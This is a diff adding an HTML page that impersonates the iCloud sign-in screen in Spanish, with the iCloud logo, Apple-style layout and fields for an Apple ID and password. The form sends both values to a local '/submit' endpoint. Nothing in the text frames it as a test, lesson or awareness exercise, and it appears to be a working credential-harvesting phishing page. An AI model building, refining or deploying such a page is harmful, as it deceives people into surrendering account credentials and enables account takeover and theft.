@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud - Iniciar sesión</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .apple-input:focus + label, .apple-input:not(:placeholder-shown) + label {
+            transform: translateY(-10px) scale(0.75);
+            color: #0071e3;
+        }
+    </style>
+</head>
+<body class="bg-white flex items-center justify-center min-h-screen">
+
+    <div class="w-full max-w-[400px] px-6 text-center">
+        <div class="flex justify-center mb-6">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/1/1c/ICloud_logo.svg" alt="iCloud" class="h-20">
+        </div>
+
+        <h1 class="text-3xl font-semibold text-gray-900 mb-8">Inicia sesión con tu Apple ID</h1>
+
+        <form action="/submit" method="POST" class="space-y-4">
+            <div class="border border-gray-300 rounded-xl overflow-hidden shadow-sm">
+                <div class="relative border-bottom border-gray-300">
+                    <input name="username" type="text" placeholder="Apple ID" required
+                        class="apple-input w-full px-4 py-4 text-lg border-b outline-none focus:ring-1 focus:ring-blue-500">
+                </div>
+                <div class="relative">
+                    <input name="password" type="password" placeholder="Contraseña" required
+                        class="apple-input w-full px-4 py-4 text-lg outline-none focus:ring-1 focus:ring-blue-500">
+                </div>
+            </div>
+
+            <div class="flex justify-center mt-6">
+                <button type="submit" class="bg-gray-800 hover:bg-black text-white p-3 rounded-full transition duration-300">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
+                    </svg>
+                </button>
+            </div>
+
+            <div class="mt-8 space-y-4">
+                <div class="flex items-center justify-center space-x-2">
+                    <input type="checkbox" id="remember" class="rounded border-gray-300 text-blue-600 focus:ring-blue-500">
+                    <label for="remember" class="text-sm text-gray-600">Permanecer conectado</label>
+                </div>
+
+                <div class="pt-6 border-t border-gray-200">
+                    <a href="#" class="text-sm text-blue-600 hover:underline">¿Olvidaste tu Apple ID o la contraseña?</a>
+                </div>
+            </div>
+        </form>
+
+        <p class="mt-12 text-xs text-gray-500">
+            Tu Apple ID es la cuenta que usas para acceder a todos los servicios de Apple.
+        </p>
+    </div>
+
+</body>
+</html>
